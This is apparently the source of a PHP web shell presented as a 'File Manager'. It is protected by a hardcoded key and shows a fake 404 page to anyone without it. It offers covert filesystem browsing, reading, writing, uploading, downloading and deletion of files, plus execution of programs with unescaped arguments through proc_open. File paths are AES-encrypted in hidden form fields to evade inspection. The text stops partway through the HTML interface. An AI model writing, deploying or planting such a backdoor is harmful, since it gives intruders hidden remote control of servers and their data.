<?php
// ============================================================
// CONFIGURATION  -- only section you should ever need to edit
// ============================================================
define('SERVER_KEY',      'MyS3cr3tServerK3y!'); // change this
define('EXEC_TIMEOUT_SEC', 30);
$EXE_EXTENSIONS = ['.exe', '.bat', '.cmd', '.ps1', '.sh', ''];

// ============================================================
// SESSION
// ============================================================
session_start();

function is_auth()          { return ($_SESSION['auth'] ?? '') === '1'; }
function skey()             { return $_SESSION['skey'] ?? ''; }
function get_sess($k, $d='') { return $_SESSION[$k] ?? $d; }
function set_sess($k, $v)   { $_SESSION[$k] = $v; }
function del_sess(...$keys) { foreach ($keys as $k) unset($_SESSION[$k]); }
function f($k)              { return trim($_POST[$k] ?? ''); }

// ============================================================
// AES-256-CBC TRANSPORT LAYER
// ============================================================
function derive_key($session_key) {
    return hash('sha256', $session_key, true); // raw 32 bytes
}

function aes_encrypt($plain, $key) {
    if ($plain === '' || $plain === null) return '';
    $dk  = derive_key($key);
    $iv  = random_bytes(16);
    $ct  = openssl_encrypt($plain, 'aes-256-cbc', $dk, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $ct);
}

function aes_decrypt($cipher_b64, $key) {
    if ($cipher_b64 === '' || $cipher_b64 === null) return '';
    try {
        $data = base64_decode($cipher_b64, true);
        if ($data === false || strlen($data) < 17) return '';
        $iv   = substr($data, 0, 16);
        $body = substr($data, 16);
        $dk   = derive_key($key);
        $pt   = openssl_decrypt($body, 'aes-256-cbc', $dk, OPENSSL_RAW_DATA, $iv);
        return $pt === false ? '' : $pt;
    } catch (Throwable $e) { return ''; }
}

// URL-safe Base64 helpers
function to_safe($b64)   { return rtrim(strtr($b64, '+/', '-_'), '='); }
function from_safe($safe) {
    $b64 = strtr($safe, '-_', '+/');
    $pad = strlen($b64) % 4;
    if ($pad === 2) $b64 .= '==';
    elseif ($pad === 3) $b64 .= '=';
    return $b64;
}

function enc($s) { return to_safe(aes_encrypt($s, skey())); }
function dec($s) { return aes_decrypt(from_safe($s), skey()); }

// ============================================================
// AUTH
// ============================================================
function make_session_key($user_key) {
    return hash('sha256', $user_key . SERVER_KEY);
}

function require_auth() { if (!is_auth()) send_404(); }

function send_404() {
    http_response_code(404);
    header('Content-Type: text/html');
    echo '<html><body><h1>404 Not Found</h1></body></html>';
    exit;
}

// ============================================================
// CURRENT WORKING DIRECTORY
// ============================================================
function get_cwd() {
    $d = get_sess('cwd');
    if (!$d || !@is_dir($d)) {
        $d = __DIR__;
        set_sess('cwd', $d);
    }
    // Strip trailing slash ONLY if not bare root '/' or 'C:\'
    if ($d !== '/' && !preg_match('/^[A-Za-z]:\\$/', $d)) {
        $d = rtrim($d, '/\\');
    }
    if ($d === '') $d = '/';
    return $d;
}

function set_cwd($d) { set_sess('cwd', $d); }

function path_join($dir, $name) {
    // Avoid double slashes when $dir is bare '/'
    $dir = rtrim($dir, '/\\');
    return $dir . DIRECTORY_SEPARATOR . $name;
}

function resolve_path($path) {
    if ($path === '' || $path === null) return '';
    $cwd = get_cwd();
    // Absolute paths pass through; relative paths are resolved against CWD
    if (DIRECTORY_SEPARATOR === '\\') {
        $is_rooted = (strlen($path) >= 2 && $path[1] === ':') || in_array($path[0], ['\\', '/']);
    } else {
        $is_rooted = $path[0] === '/';
    }
    $resolved = realpath($cwd . DIRECTORY_SEPARATOR . $path);
    $r = $is_rooted ? $path : ($resolved !== false ? $resolved : ($cwd . DIRECTORY_SEPARATOR . $path));
    $r = rtrim($r, '/\\');
    // Bare drive on Windows e.g. "C:"
    if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[A-Za-z]:$/', $r)) $r .= '\\';
    return $r;
}

function open_in_editor($full_path) {
    set_sess('editorContent', file_get_contents($full_path));
    set_sess('openFile', $full_path);
    set_sess('panel', 'editor');
}

// ============================================================
// HELPERS
// ============================================================
$_msg      = ['text' => '', 'kind' => ''];
function msg($text, $kind) { global $_msg; $_msg = ['text' => $text, 'kind' => $kind]; }

function fmt_bytes($b) {
    if ($b < 1024)    return $b . 'B';
    if ($b < 1048576) return number_format($b / 1024.0, 1) . 'KB';
    return number_format($b / 1048576.0, 1) . 'MB';
}

function js_str($s) {
    if ($s === '' || $s === null) return '';
    return addslashes($s);
}

global $EXE_EXTENSIONS;
function is_exe($filename) {
    global $EXE_EXTENSIONS;
    $ext = strtolower(strrchr($filename, '.') ?: '');
    return in_array($ext, $EXE_EXTENSIONS, true);
}

// ============================================================
// LISTING
// ============================================================
function render_listing() {
    $cwd = get_cwd();
    $out = '';

    // Drives (Windows only)
    if (DIRECTORY_SEPARATOR === '\\') {
        foreach (range('A', 'Z') as $letter) {
            $drv = $letter . ':\\';
            if (is_dir($drv)) {
                $out .= entry_row('entry-drive', '&#128190;', $drv, '', enc($drv), false);
            }
        }
    }

    // List entries via scandir (works for any accessible path)
    // Do NOT strip slash from bare root '/'
    $base = ($cwd === '/' || preg_match('/^[A-Za-z]:\\\\$/', $cwd))
        ? $cwd
        : rtrim($cwd, '/\\');
    if ($base === '') $base = '/';
    $entries = @scandir($base);
    if ($entries === false) {
        $out .= "<div class='entry-err'>Cannot open directory: " . htmlspecialchars($base) . "</div>";
    } else {
        $dirs_list  = [];
        $files_list = [];
        foreach ($entries as $name) {
            if ($name === '.' || $name === '..') continue;
            $full = path_join($base, $name);
            if (@is_dir($full))       $dirs_list[]  = $name;
            elseif (@is_file($full))  $files_list[] = $name;
        }
        sort($dirs_list,  SORT_STRING | SORT_FLAG_CASE);
        sort($files_list, SORT_STRING | SORT_FLAG_CASE);

        foreach ($dirs_list as $name) {
            $full = path_join($base, $name);
            $out .= entry_row('entry-dir', '&#128193;', $name, '', enc($full), false);
        }
        foreach ($files_list as $name) {
            $full  = path_join($base, $name);
            $size  = @filesize($full);
            $exe   = is_exe($name);
            $out  .= entry_row(
                $exe ? 'entry-exe' : 'entry-file',
                $exe ? '&#9881;'   : '&#128196;',
                $name,
                $size !== false ? fmt_bytes($size) : '',
                enc($full),
                $exe
            );
        }
    }

    return $out;
}

function entry_row($cls, $icon, $name, $meta, $enc, $is_exe) {
    $safe    = htmlspecialchars($name, ENT_QUOTES);
    $is_file = ($cls === 'entry-file' || $is_exe);
    $click   = $is_file
        ? "onclick='readFile(\"$enc\")'"
        : "onclick='cdDir(\"$enc\")'";

    $actions = '';
    if ($is_file) {
        $actions  = "<span class='entry-actions'>";
        $actions .= "<button class='act-btn' title='Read' onclick='event.stopPropagation();readFile(\"$enc\")'>&#128065;</button>";
        $actions .= "<button class='act-btn act-dl' title='Download' onclick='event.stopPropagation();downloadFile(\"$enc\")'>&#8659;</button>";
        if ($is_exe)
            $actions .= "<button class='act-btn act-run' title='Run' onclick='event.stopPropagation();runExe(\"$enc\")'>&#9654;</button>";
        $actions .= "<button class='act-btn act-del' title='Delete' onclick='event.stopPropagation();deleteFile(\"$enc\",\"$safe\")'>&#128465;</button>";
        $actions .= "</span>";
    }

    return "<div class='entry $cls' $click>"
         . "<span class='entry-icon'>$icon</span>"
         . "<span class='entry-name' title='$safe'>$safe</span>"
         . "<span class='entry-meta'>$meta</span>"
         . "$actions</div>";
}

// ============================================================
// REQUEST HANDLING (runs before HTML output)
// ============================================================
$action = $_POST['__ACTION'] ?? '';

// ---- Download (early exit before any output) ----
$dl = f('hDownloadPath');
if ($dl !== '' && is_auth()) {
    $fp = dec($dl);
    if ($fp !== '' && file_exists($fp) && is_file($fp)) {
        $fname = basename($fp);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . addslashes($fname) . '"');
        header('Content-Length: ' . filesize($fp));
        readfile($fp);
        exit;
    }
}

// ---- Login ----
if ($action === 'login') {
    $key = trim($_POST['userKey'] ?? '');
    if ($key === '') {
        $login_err = 'Enter a key.';
    } elseif ($key !== SERVER_KEY) {
        send_404();
    } else {
        set_sess('auth', '1');
        set_sess('skey', make_session_key($key));
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
}

// ---- Logout ----
if ($action === 'logout' && is_auth()) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// All actions below require auth — wrapped in a function to allow early return
function handle_post() {
    global $exec_output, $exec_error, $action;

    // ---- CD into directory ----
    $cd = f('__CDDIR');
    if ($cd !== '') {
        $dir = dec($cd);
        if (is_dir($dir)) { set_cwd($dir); msg("Entered: $dir", 'ok'); }
        return;
    }

    // ---- Read file into editor ----
    $rf = f('__RDFILE');
    if ($rf !== '') {
        $fp = dec($rf);
        if (file_exists($fp) && is_file($fp)) {
            try { open_in_editor($fp); msg("Read: $fp", 'ok'); }
            catch (Throwable $e) { msg('Read error: ' . $e->getMessage(), 'err'); }
        }
        return;
    }

    // ---- Queue executable ----
    $rx = f('__RUNEXE');
    if ($rx !== '') {
        $rp = dec($rx);
        if ($rp !== '') {
            set_sess('runExe', $rp);
            set_sess('panel', 'exec');
            msg('Ready to run: ' . basename($rp), 'info');
        }
        return;
    }

    // ---- Delete file ----
    $dx = f('__DELFILE');
    if ($dx !== '') {
        $fp = dec($dx);
        if ($fp !== '' && file_exists($fp) && is_file($fp)) {
            try {
                unlink($fp);
                if (get_sess('openFile') === $fp)
                    del_sess('openFile', 'editorContent', 'panel', 'newFile');
                msg("Deleted: $fp", 'ok');
            } catch (Throwable $e) { msg('Delete error: ' . $e->getMessage(), 'err'); }
        } else {
            msg('File not found or already deleted.', 'err');
        }
        return;
    }

    // ---- Navigate to path ----
    if ($action === 'go') {
        $dir = resolve_path(dec(f('hPath')));
        if ($dir === '') { msg('Enter a path.', 'err'); }
        elseif (!is_dir($dir)) { msg("Not found: $dir", 'err'); }
        else { set_cwd($dir); msg("Directory: $dir", 'ok'); }
        return;
    }

    // ---- Read by typed filename ----
    if ($action === 'read') {
        $fp = resolve_path(dec(f('hFilename')));
        if (!file_exists($fp)) { msg("File not found: $fp", 'err'); }
        else { try { open_in_editor($fp); msg("Read: $fp", 'ok'); } catch (Throwable $e) { msg('Read error: ' . $e->getMessage(), 'err'); } }
        return;
    }

    // ---- Save / write ----
    if ($action === 'write') {
        $fname = f('hFilenamePlain');
        if ($fname === '') $fname = get_sess('openFile');
        if ($fname === '') { msg('Enter a filename.', 'err'); return; }
        $full = resolve_path($fname);
        $b64  = trim($_POST['hContentPlain'] ?? '');
        $body = '';
        if ($b64 !== '') {
            $decoded = base64_decode($b64, true);
            $body = $decoded !== false ? $decoded : $b64;
        }
        try {
            file_put_contents($full, $body);
            set_sess('openFile', $full);
            del_sess('newFile');
            msg("Saved: $full", 'ok');
        } catch (Throwable $e) { msg('Write error: ' . $e->getMessage(), 'err'); }
        return;
    }

    // ---- New file ----
    if ($action === 'new') {
        del_sess('openFile', 'editorContent');
        set_sess('panel', 'editor');
        set_sess('newFile', '1');
        msg('New file - enter a name and content, then Save.', 'info');
        return;
    }

    // ---- Cancel edit ----
    if ($action === 'cancel_edit') {
        del_sess('openFile', 'panel', 'newFile', 'editorContent');
        return;
    }

    // ---- Up directory ----
    if ($action === 'up') {
        $cwd = get_cwd(); // already normalized by get_cwd()

        // Already at filesystem root?
        if ($cwd === '/' || preg_match('/^[A-Za-z]:\\$/', $cwd)) {
            msg('Already at root.', 'info');
            return;
        }

        $parent = dirname($cwd);

        // dirname() on a top-level Linux dir e.g. '/var' returns '/'
        // dirname() on 'C:\foo' returns 'C:\'
        // both are valid — just make sure it's a real accessible dir
        if (!$parent || !@is_dir($parent)) {
            msg('Already at root.', 'info');
            return;
        }

        set_cwd($parent);
        msg("Up to: $parent", 'ok');
        return;
    }

    // ---- Upload ----
    if ($action === 'upload') {
        if (empty($_FILES['upload_file']['name'])) { msg('No file selected.', 'err'); return; }
        $dest = path_join(get_cwd(), basename($_FILES['upload_file']['name']));
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest))
            msg('Uploaded: ' . basename($dest), 'ok');
        else
            msg('Upload failed.', 'err');
        return;
    }

    // ---- Execute ----
    if ($action === 'exec') {
        $h_exe_path  = f('hExePath');
        $h_exe_plain = f('hExePathPlain');
        $sess_run    = get_sess('runExe');
        $decrypted   = dec($h_exe_path);

        $fp = $sess_run ?: ($h_exe_plain ?: $decrypted);
        // Normalize multiple slashes e.g. //usr/bin/bash -> /usr/bin/bash
        $fp = preg_replace('#/+#', '/', $fp);
        if ($fp === '' || !file_exists($fp)) {
            $exec_output = "Executable not found. fp=$fp";
            $exec_error  = true;
            set_sess('panel', 'exec');
            msg("Executable not found.", 'err');
            return;
        }

        $args    = trim($_POST['exeArgs'] ?? '');
        $dir     = dirname($fp);
        $cmd     = escapeshellcmd($fp) . ($args ? ' ' . $args : '');

        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        $proc = proc_open($cmd, $descriptors, $pipes, $dir);
        if (!is_resource($proc)) {
            $exec_output = "ERROR: Could not start process.";
            $exec_error  = true;
            set_sess('panel', 'exec');
            msg('Exec failed: could not start process.', 'err');
            return;
        }
        fclose($pipes[0]);

        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);
        $stdout = ''; $stderr = '';
        $start = microtime(true);
        $killed = false;
        while (true) {
            $r = [$pipes[1], $pipes[2]]; $w = null; $e = null;
            $changed = stream_select($r, $w, $e, 0, 50000);
            if ($changed) {
                foreach ($r as $s) {
                    $chunk = fread($s, 8192);
                    if ($chunk !== false) {
                        if ($s === $pipes[1]) $stdout .= $chunk;
                        else $stderr .= $chunk;
                    }
                }
            }
            $status = proc_get_status($proc);
            if (!$status['running']) {
                $stdout .= stream_get_contents($pipes[1]);
                $stderr .= stream_get_contents($pipes[2]);
                break;
            }
            if ((microtime(true) - $start) >= EXEC_TIMEOUT_SEC) {
                $stdout .= stream_get_contents($pipes[1]);
                $stderr .= stream_get_contents($pipes[2]);
                proc_terminate($proc);
                $killed = true;
                break;
            }
        }
        fclose($pipes[1]); fclose($pipes[2]);
        $exit_code = proc_close($proc);

        $out  = "=== " . basename($fp) . ($args ? " $args" : "") . "\n";
        $out .= "=== Exit: " . ($killed ? 'killed (timeout)' : $exit_code) . " ===\n";
        if ($stdout !== '') $out .= $stdout;
        // Only show stderr if process failed or stderr has real content beyond whitespace
        $stderr_clean = trim($stderr);
        if ($stderr_clean !== '' && ($exit_code !== 0 || $killed)) {
            $out .= "\n--- STDERR ---\n" . $stderr . "\n";
        } elseif ($stderr_clean !== '') {
            // exit 0 but has stderr — show as a faded note
            $out .= "\n--- STDERR (warnings only) ---\n" . $stderr . "\n";
        }
        if ($killed) $out .= "\n(Process exceeded timeout and was killed.)\n";

        $exec_output = $out;
        $exec_error  = ($killed || $exit_code !== 0);
        set_sess('panel', 'exec');
        msg('Executed: ' . basename($fp) . ($killed ? ' (timeout — killed)' : " (exit $exit_code)"),
            (!$killed && $exit_code === 0) ? 'ok' : 'err');
        return;
    }

    // ---- Cancel exec ----
    if ($action === 'cancel_exec') {
        del_sess('runExe', 'panel');
        return;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && is_auth()) {
    handle_post();
}

// ============================================================
// VIEW HELPERS
// ============================================================
$auth         = is_auth();
$cwd_display  = $auth ? htmlspecialchars(get_cwd()) : '';
$listing_html = $auth ? render_listing() : '';
$open_file    = htmlspecialchars(get_sess('openFile'));
$editor_content = htmlspecialchars(get_sess('editorContent'));
$run_exe      = htmlspecialchars(get_sess('runExe'));
$open_file_js = js_str(get_sess('openFile'));
$run_exe_js   = js_str(get_sess('runExe'));
$active_panel = get_sess('panel', 'none');
$is_new_file  = get_sess('newFile') === '1';
$auth_skey    = $auth ? skey() : '';

$login_err    = $login_err ?? '';
$exec_output  = $exec_output ?? null;

?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>File Manager</title>
<style>
/* ── Design tokens ───────────────────────────────────────── */
:root {
  --bg:      #0d0f14; --surface: #13161e; --surface2: #1a1e2a;
  --border:  #252a38; --border2: #2e3448;
  --accent:  #4f9eff; --accent2: #7b61ff;
  --ok:      #22d392; --err: #ff5f5f; --info: #f0c040; --run: #ff9f40;
  --text:    #d4daf0; --muted: #606880; --dim: #3a3f55;
  --mono:    'Courier New', monospace;
  --sans:    'Segoe UI', system-ui, sans-serif;
  --sidebar: 260px; --hdr: 48px;
}
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; }
body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 13px; display: flex; flex-direction: column; }
input[type=hidden] { display: none !important; }

/* ── Login ───────────────────────────────────────────────── */
.login-wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.login-box  { background: var(--surface); border: 1px solid var(--border); border-radius: 12px;
              padding: 36px 40px; width: 360px; display: flex; flex-direction: column; gap: 18px; }
.login-title { font-size: 1.2rem; font-weight: 700; text-align: center;
               background: linear-gradient(90deg,var(--accent),var(--accent2));
               -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
.login-sub  { font-size: 12px; color: var(--muted); text-align: center; margin-top: -10px; }
.login-field { display: flex; flex-direction: column; gap: 6px; }
.login-field label { font-size: 12px; color: var(--muted); }
.login-field input { background: var(--surface2); border: 1px solid var(--border); color: var(--text);
  border-radius: 7px; padding: 9px 12px; font-size: 14px; font-family: var(--mono);
  outline: none; width: 100%; letter-spacing: .1em; transition: border-color .15s; }
.login-field input:focus { border-color: var(--accent); }
.login-err  { color: var(--err); font-size: 12px; text-align: center; }
.btn-login  { background: linear-gradient(90deg,var(--accent),var(--accent2)); color: #fff;
  border: none; border-radius: 7px; padding: 10px; font-size: 14px; font-weight: 700;
  cursor: pointer; width: 100%; transition: opacity .15s; }
.btn-login:hover { opacity: .88; }

/* ── Top bar ─────────────────────────────────────────────── */
.topbar { height: var(--hdr); background: var(--surface); border-bottom: 1px solid var(--border);
  display: flex; align-items: center; gap: 10px; padding: 0 14px; flex-shrink: 0; z-index: 10; }
.topbar-logo { font-weight: 700; font-size: 14px; letter-spacing: .04em; white-space: nowrap;
  background: linear-gradient(90deg,var(--accent),var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
.topbar-path { font-family: var(--mono); font-size: 11px; color: var(--muted); flex: 1;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  background: var(--surface2); border: 1px solid var(--border); border-radius: 5px; padding: 3px 8px; }
.topbar-msg  { font-size: 11px; padding: 3px 10px; border-radius: 5px; white-space: nowrap;
  max-width: 400px; overflow: hidden; text-overflow: ellipsis; }
.msg-ok   { background:#0a2a1e; border:1px solid #1e5040; color:var(--ok);   }
.msg-err  { background:#2a0e0e; border:1px solid #5a2020; color:var(--err);  }
.msg-info { background:#2a2208; border:1px solid #5a4a10; color:var(--info); }
.btn-logout { background:none; border:1px solid var(--border); color:var(--muted);
  border-radius:5px; padding:3px 10px; font-size:11px; cursor:pointer; white-space:nowrap; }
.btn-logout:hover { color:var(--err); border-color:var(--err); }

/* ── App layout ──────────────────────────────────────────── */
.layout { display: flex; flex: 1; overflow: hidden; height: calc(100vh - var(--hdr)); min-height: 0; }

/* ── Sidebar ─────────────────────────────────────────────── */
.sidebar { width: var(--sidebar); min-width: var(--sidebar); max-width: var(--sidebar);
  background: var(--surface); border-right: 1px solid var(--border);
  display: flex; flex-direction: column; overflow: hidden; height: 100%; }
.sidebar-nav    { display: flex; gap: 4px; padding: 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
.sidebar-search { padding: 6px 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
.sidebar-search input { width: 100%; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 4px 8px; font-size: 12px; font-family: var(--mono); outline: none; }
.sidebar-search input:focus { border-color: var(--accent); }
.sidebar-upload { display: flex; gap: 4px; padding: 6px 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; align-items: center; }
.sidebar-list   { flex: 1; overflow-y: scroll; overflow-x: hidden; padding: 4px 0; min-height: 0; }
.cd-row         { display: flex; gap: 4px; padding: 6px 8px; flex-shrink: 0; border-top: 1px solid var(--border); }
.cd-row input   { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 4px 8px; font-family: var(--mono); font-size: 11px; outline: none; }
.cd-row input:focus { border-color: var(--accent); }
.upload-input { flex: 1; min-width: 0; font-size: 11px; color: var(--muted);
  background: var(--surface2); border: 1px solid var(--border); border-radius: 5px;
  padding: 3px 6px; cursor: pointer; overflow: hidden; }
.upload-input::-webkit-file-upload-button { background: var(--surface); border: 1px solid var(--border);
  color: var(--muted); border-radius: 4px; padding: 2px 6px; font-size: 10px; cursor: pointer; }

/* ── File entries ────────────────────────────────────────── */
.entry { display: flex; align-items: center; gap: 6px; padding: 4px 8px; cursor: pointer;
  border-radius: 4px; margin: 0 4px; transition: background .1s; user-select: none; min-height: 28px; }
.entry:hover { background: var(--surface2); }
.entry-icon    { font-size: 13px; flex-shrink: 0; width: 16px; text-align: center; }
.entry-name    { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 12px; }
.entry-meta    { font-size: 10px; color: var(--muted); flex-shrink: 0; }
.entry-actions { display: flex; gap: 3px; flex-shrink: 0; opacity: 0; transition: opacity .15s; }
.entry:hover .entry-actions { opacity: 1; }
.entry-drive .entry-name { color: var(--accent2); font-weight: 600; }
.entry-dir   .entry-name { color: var(--accent); }
.entry-exe   .entry-name { color: var(--run); }
.entry-file  .entry-name { color: var(--text); }
.entry-err  { color: var(--err); font-size: 11px; padding: 6px 10px; font-style: italic; }
.act-btn    { background: transparent; border: none; color: var(--muted);
  border-radius: 4px; padding: 2px 5px; font-size: 13px; cursor: pointer;
  transition: color .1s, background .1s; line-height: 1; }
.act-btn:hover     { color: var(--accent); background: var(--surface2); }
.act-run:hover     { color: var(--run);    background: var(--surface2); }
.act-dl:hover      { color: var(--ok);     background: var(--surface2); }
.act-del:hover     { color: var(--err);    background: var(--surface2); }

/* ── Resize handle ───────────────────────────────────────── */
.resize-handle { width: 4px; background: transparent; cursor: col-resize; flex-shrink: 0; transition: background .15s; }
.resize-handle:hover, .resize-handle.dragging { background: var(--accent); }

/* ── Main panel ──────────────────────────────────────────── */
.main       { flex: 1; overflow: hidden; display: flex; flex-direction: column; min-width: 0; }
.panel-tabs { display: flex; gap: 1px; background: var(--border); flex-shrink: 0; }
.tab        { padding: 8px 16px; font-size: 12px; font-weight: 600; color: var(--muted);
  cursor: pointer; background: var(--surface2); border: none;
  transition: color .1s, background .1s; display: flex; align-items: center; gap: 6px; }
.tab:hover  { color: var(--text); background: var(--surface); }
.tab.active { color: var(--text); background: var(--bg); }
.tab .tab-x { font-size: 10px; color: var(--muted); margin-left: 4px; }
.tab:hover .tab-x { color: var(--err); }
.panel-body { flex: 1; overflow-y: auto; display: flex; flex-direction: column; padding: 14px; background: var(--bg); min-height: 0; }
.panel-body.panel-hidden { display: none !important; }
.panel-welcome { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--dim); gap: 10px; }
.panel-welcome svg { opacity: .25; }

/* ── Editor ──────────────────────────────────────────────── */
.editor-topbar { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-shrink: 0; }
.editor-topbar input { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.editor-topbar input:focus { border-color: var(--accent); }
textarea.editor { flex: 1; min-height: 300px; background: var(--surface2); border: 1px solid var(--border);
  color: #c8d4f0; border-radius: 6px; padding: 10px; font-family: var(--mono);
  font-size: 12px; line-height: 1.6; resize: vertical; outline: none; transition: border-color .15s; }
textarea.editor:focus { border-color: var(--accent); }
.editor-actions { display: flex; gap: 8px; margin-top: 10px; flex-shrink: 0; }

/* ── Execute panel ───────────────────────────────────────── */
.exec-topbar  { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-shrink: 0; }
.exec-path    { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--run); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.exec-args-row { display: flex; gap: 8px; margin-bottom: 10px; flex-shrink: 0; align-items: center; }
.exec-args-row label { font-size: 11px; color: var(--muted); white-space: nowrap; }
.exec-args-row input { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.exec-args-row input:focus { border-color: var(--accent); }
textarea.console { flex: 1; min-height: 300px; background: #050810; border: 1px solid var(--border);
  color: #7dff9a; border-radius: 6px; padding: 10px; font-family: var(--mono); font-size: 12px; line-height: 1.55; resize: vertical; overflow-y: auto; outline: none; }
pre.console     { flex: 1; min-height: 60px; background: #050810; border: 1px solid var(--border);
  color: #7dff9a; border-radius: 6px; padding: 10px; font-family: var(--mono); font-size: 12px; line-height: 1.55; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
.exec-actions { display: flex; gap: 8px; margin-top: 10px; flex-shrink: 0; }

/* ── Buttons ─────────────────────────────────────────────── */
.btn         { display: inline-flex; align-items: center; gap: 5px; padding: 5px 12px; border: none;
  border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer;
  transition: filter .15s, transform .1s; white-space: nowrap; }
.btn:active  { transform: scale(.97); }
.btn:hover   { filter: brightness(1.12); }
.btn-sm      { padding: 3px 9px; font-size: 11px; }
.btn-primary { background: var(--accent);   color: #fff; }
.btn-ghost   { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
.btn-danger  { background: #3a1a1a; color: var(--err); border: 1px solid #5a2a2a; }
.btn-success { background: #0e3028; color: var(--ok);  border: 1px solid #1e5040; }
.btn-run     { background: #2a1e08; color: var(--run); border: 1px solid #5a3e10; }

/* ── Scrollbar ───────────────────────────────────────────── */
::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--muted); }
</style>
</head>
<body>
<form id="fm" method="post" enctype="multipart/form-data" action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>">

  <!-- Hidden transport fields -->
  <input type="hidden" name="__CDDIR"       id="hCdDir"       />
  <input type="hidden" name="__RDFILE"      id="hRdFile"      />
  <input type="hidden" name="__RUNEXE"      id="hRunExe"      />
  <input type="hidden" name="__DELFILE"     id="hDelFile"     />
  <input type="hidden" name="hPath"         id="hPath"        />
  <input type="hidden" name="hFilename"     id="hFilename"    />
  <input type="hidden" name="hExePath"      id="hExePath"     />
  <input type="hidden" name="hDownloadPath" id="hDlPath"      />
  <input type="hidden" name="hExePathPlain" id="hExePathPlain"/>
  <input type="hidden" name="hFilenamePlain"id="hFnPlain"     />
  <input type="hidden" name="hContentPlain" id="hConPlain"    />
  <input type="hidden" name="__ACTION"      id="hAction"      />

<?php if (!$auth): ?>
  <!-- LOGIN -->
  <div class="login-wrap">
    <div class="login-box">
      <div class="login-title">&#128193; File Manager</div>
      <div class="login-sub">Enter your access key to continue</div>
      <div class="login-field">
        <label>Access Key</label>
        <input type="password" name="userKey" placeholder="••••••••" autocomplete="off"/>
      </div>
      <?php if ($login_err): ?><div class="login-err"><?= htmlspecialchars($login_err) ?></div><?php endif; ?>
      <button type="submit" class="btn-login" onclick="document.getElementById('hAction').value='login'">Unlock</button>
    </div>
  </div>

<?php else: ?>
  <!-- APP -->

  <!-- Topbar -->
  <div class="topbar">
    <span class="topbar-logo">&#128193; File Manager</span>
    <span class="topbar-path"><?= $cwd_display ?></span>
    <?php if ($_msg['text']): ?>
    <span class="topbar-msg msg-<?= htmlspecialchars($_msg['kind']) ?>"><?= htmlspecialchars($_msg['text']) ?></span>
    <?php endif; ?>
    <button type="submit" class="btn-logout" onclick="_clearHidden();document.getElementById('hAction').value='logout';">Lock</button>
  </div>

  <!-- Hidden download trigger -->
  <button type="submit" id="BtnDownload" style="display:none" onclick="document.getElementById('hAction').value='';"></button>

  <div class="layout">

    <!-- SIDEBAR -->
    <div class="sidebar" id="sidebar">

      <div class="sidebar-nav">
        <button type="submit" class="btn btn-ghost btn-sm" onclick="_clearHidden();document.getElementById('hAction').value='up';">Up</button>
        <button type="submit" class="btn btn-primary btn-sm" onclick="_clearHidden();document.getElementById('hAction').value='new';">New File</button>
      </div>

      <div class="sidebar-search">
        <input type="text" id="filterInput" placeholder="Filter files..." oninput="FM.filter(this.value)" autocomplete="off"/>
      </div>

      <div class="sidebar-upload">
        <input type="file" name="upload_file" class="upload-input"/>
        <button type="submit" class="btn btn-ghost btn-sm" onclick="_clearHidden();document.getElementById('hAction').value='upload';">Upload</button>
      </div>

      <div class="sidebar-list" id="sidebarList">
        <?= $listing_html ?>
      </div>

      <div class="cd-row">
        <input type="text" id="visPath" placeholder="Go to path..." autocomplete="off"
               onkeydown="if(event.key==='Enter') FM.go();"/>
        <button type="submit" class="btn btn-ghost btn-sm" id="BtnGo"
                onclick="return FM.prepGo();">Go</button>
      </div>
    </div>

    <div class="resize-handle" id="resizeHandle"></div>

    <!-- MAIN PANEL -->
    <div class="main">

      <div class="panel-tabs">
        <button type="button" class="tab" id="tabWelcome" onclick="FM.showPanel('welcome')">Browse</button>
        <button type="button" class="tab" id="tabEditor"  onclick="FM.showPanel('editor')"  style="display:none">
          <span id="tabEditorName">Editor</span>
          <span class="tab-x" onclick="FM.closeTab('editor',event)">x</span>
        </button>
        <button type="button" class="tab" id="tabExec" onclick="FM.showPanel('exec')" style="display:none">
          <span id="tabExecName">Execute</span>
          <span class="tab-x" onclick="FM.closeTab('exec',event)">x</span>
        </button>
      </div>

